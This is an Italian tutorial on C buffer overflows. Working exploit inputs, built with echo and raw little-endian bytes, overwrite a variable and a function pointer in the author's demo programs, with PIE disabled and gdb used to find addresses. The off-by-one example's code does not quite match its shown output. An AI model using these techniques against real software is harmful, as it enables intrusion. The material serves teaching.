# Buffer overflow

Il buffer overflow è una tra le vulnerabilità più comuni tra i software, la principale causa di questa vulnerabilità è la scrittura di codice non corretta e sicura.

Il **buffer overflow** è una condizione in cui è possibile riempire un buffer **oltre** alla sua capacità allocata, andando così a sovrascrivere altre informazioni in memoria.

Questa vulnerabilità viene usata principalmente per:

- far crashare il sistema
- inserire dati che rompono l’integrità
- inserire codice per ottenere il controllo del sistema

Linguaggi come C sono ritenuti “unsafe” e lasciano al programmatore la responsabilità di implementare i dovuti controlli per proteggersi dalle vulnerabilità sulla memoria.

## Rompere l’integrità e crash

Consideriamo il seguente codice C

```c
#include <string.h>
#include <stdio.h>

char buffer1[8] = "one";    // buffer of size 8 initialized with “one”
int value = 5;
char buffer2[8] = "two";    // buffer of size 8 initialized with “two”
int main(int argc, char *argv[]) {
		// prints: address = value,  before user input
	 printf("[BEFORE] buffer1 @ %1$p = %1$s\n", buffer1);
	 printf("[BEFORE] value @ %1$p = 0x%2$08x\n",&value, value);
	 printf("[BEFORE] buffer2 @ %1$p = %1$s\n", buffer2);
	
	 printf("Please enter your input: ");
	 gets(buffer1);     // reads input into buffer1, whatever length!
	 printf("\n");
	  // prints: address = value,  after user input
	 printf("[AFTER] buffer1 @ %1$p = %1$s\n", buffer1);
	 printf("[AFTER] value @ %1$p = 0x%2$08x\n",&value, value);
	 printf("[AFTER] buffer2 @ %1$p = %1$s\n", buffer2);
}
```

Abbiamo quindi  l’allocazione di un buffer, una variabile e un altro buffer.

Viene preso un input utente e viene inserito nel primo buffer.

Esecuzione:

```bash
$ echo "prova" | ./prova
[BEFORE] buffer1 @ 0x7fe3b7d9a010 = one
[BEFORE] value   @ 0x7fe3b7d9a018 = 0x00000005
[BEFORE] buffer2 @ 0x7fe3b7d9a020 = two
Please enter your input:
[AFTER] buffer1 @ 0x7fe3b7d9a010 = prova
[AFTER] value   @ 0x7fe3b7d9a018 = 0x00000005
[AFTER] buffer2 @ 0x7fe3b7d9a020 = two
```

Con questo input non è successo nulla di strano, l’input è stato inserito nel primo buffer.

Notiamo come gli indirizzi delle variabili sono sequenziali, distanziati di 8 byte.

Se la dimensione dell’input rientra nella dimensione del buffer non ci sono problemi, ma non abbiamo controlli per forzare che ciò avvenga sempre, infatti è possibile inserire un input più grande:

```bash
$ echo "AAAAAAAA" | ./prova
[BEFORE] buffer1 @ 0x7f92ba1bc010 = one
[BEFORE] value   @ 0x7f92ba1bc018 = 0x00000005
[BEFORE] buffer2 @ 0x7f92ba1bc020 = two
Please enter your input:
[AFTER] buffer1 @ 0x7f92ba1bc010 = AAAAAAAA
[AFTER] value   @ 0x7f92ba1bc018 = 0x00000000
[AFTER] buffer2 @ 0x7f92ba1bc020 = two
```

la stringa con 8 caratteri ‘A’ va in overflow in quanto la stringa contiene anche il **carattere terminatore** `0x00`. Vediamo infatti che viene sovrascritto il valore della variabile `value`.

Nota che in *little endian* i byte vengono prima scritti quelli meno significativi (quelli più a destra).

Se inseriamo 9 caratteri A, otteniamo il seguente output:

```bash
$ echo "AAAAAAAAA" | ./prova
[BEFORE] buffer1 @ 0x7f669a8de010 = one
[BEFORE] value   @ 0x7f669a8de018 = 0x00000005
[BEFORE] buffer2 @ 0x7f669a8de020 = two
Please enter your input:
[AFTER] buffer1 @ 0x7f669a8de010 = AAAAAAAAA
[AFTER] value   @ 0x7f669a8de018 = 0x00000041
[AFTER] buffer2 @ 0x7f669a8de020 = two
```

Continuando ad aumentare il numero di caratteri in input, continuiamo a sovrascrivere le zone di memoria successive. Otteniamo quindi un **buffer overflow**. Ciò che può limitare la dimensione del nostro input è un errore di **segmentation fault** (e quindi crash del programma), che si verificherebbe nel caso arrivassimo a sovrascrivere zone di memoria non assegnate al nostro processo.

La funzione `gets` è *unsafe* perché non limita in alcun modo la dimensione dell’input, e non dovrebbe venir mai utilizzata, inoltre durante la compilazione appare un *warning* che avverte di ciò.

## Controllare il flusso di codice

Con il buffer overflow è possibili modificare il normale flusso di codice, principalmente in due modi:

- sovrascrivendo il puntatore ad una funzione
- sovrascrivendo con nuovo codice

Ad esempio se definiamo un tipo di dato:

```c
typedef struct element {
	 char data[16];
	 void (*f)(char *);
} element_t;
```

contenente un buffer e un puntatore ad una funzione.

In questo caso un buffer overflow può sovrascrivere il puntatore alla funzione, in modo da eseguire una funzione differente da quella attesa.

Ad esempio:

```c
typedef struct element {
	 char data[16];
	 void (*f)(char *);
} element_t;

void secret_function() {
	 printf("Secret function!\n");
}
void show_data(char *s) {
	 printf("Data = %s\n",s);
}

int main(int argc, char *argv[]) {
	 element_t e;
	 e.f = show_data;   // legitimate function
	 printf("Insert data: ");
	 gets(e.data);      // reads data, possible buffer overflow
	 e.f(e.data);
}
```

L’obiettivo dell’attacco è quello di far invocare la funzione `secret_function()` invece di `show_data()`:

Per semplificare l’attacco disabilitiamo l’opzione di compilazione **PIE** (*Position Independent Executable*) che rende più difficile exploitare la vulnerabilità in quanto renderebbe randomizzata la posizione in memoria del programma.

`$ gcc overflow-struct.c -o overflow-struct --no-pie --static`

Adesso usando gdb, possiamo ottenere l’indirizzo della funzione `secret_function()`:

```nasm
$ gdb -q overflow-struct
...
(gdb) x/x secret_function
	0x400b4d <secret_function>: 0xe5894855
```

Adesso per riuscire a sovrascrivere il puntatore bisogna riempire il buffer fino alla sua dimensione massima con dei dati qualsiasi e poi andare in overflow inserendo l’indirizzo della `secret_function`.

Nota che gli indirizzi sono a 8 byte e sono in little endian

```bash
echo -e "AAAAAAAAAAAAAAAA\x4d\x0b\x40\x00\x00\x00\x00\x00" | ./overflow-struct
Insert data: Secret function!
```

## Off-by-one bug

Un tipico errore di programmazione può essere il seguente, in cui viene sbagliato il controllo sull’indice finale di un ciclo.

```c
typedef struct element {
	 char data[16];
	 void (*f)(char *);
} element_t;

void secret_function() {
	 printf("Secret function!\n");
}
void show_data(char *s) {
	 printf("Data = %s\n",s);
}

int main(int argc, char *argv[]) {
	 element_t e;
	 e.f = show_data; // legitimate function
	 printf("Insert data: ");
	 memset(e.data, 0, sizeof(e.data));
	
	 //the error in the following line is: i<=sizeof(e.data)
	 //it should be i<sizeof(e.data)
	 for (i=0; i<=sizeof(e.data) && (c=getc(stdin))!= EOF && c != '\n'; i++) {
		 e.data[i] = c;
	 }
	 printf("show_data = %p, secret_function = %p\n",show_data,secret_function);
}
```

Con l’ultima `printf` andiamo a controllare gli indirizzi assegnati alle due funzioni: `show_data` e `secret_function`. 

eseguendo il programma più volte notiamo come gli indirizzi delle due funzioni **cambiano solo per l’ultimo byte** (una termina sempre con `dd` e l’altra con `ca` e il resto dell’indirizzo è comune per entrambi).

```c
$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x560bfd9287dd, secret_function = 0x560bfd9287ca

$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x56260d01f7dd, secret_function = 0x56260d01f7ca

$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x5646872967dd, secret_function = 0x5646872967ca

$ echo -e "AAAAAAAAAAAAAAA" | ./overflow-struct-offbyone
Insert data: Data = AAAAAAAAAAAAAAA
show_data = 0x55f42b85f7dd, secret_function = 0x55f42b85f7ca
```

Sfruttando l’errore sul controllo dell’indice del buffer possiamo modificare tale byte, che ci è sufficiente per cambiare la funzione invocata:

```c
$ echo -e "AAAAAAAAAAAAAAAA\xca" | ./overflow-struct-offbyone
Insert data: Secret function!
show_data = 0x560975daa7dd, secret_function = 0x560975daa7ca
```
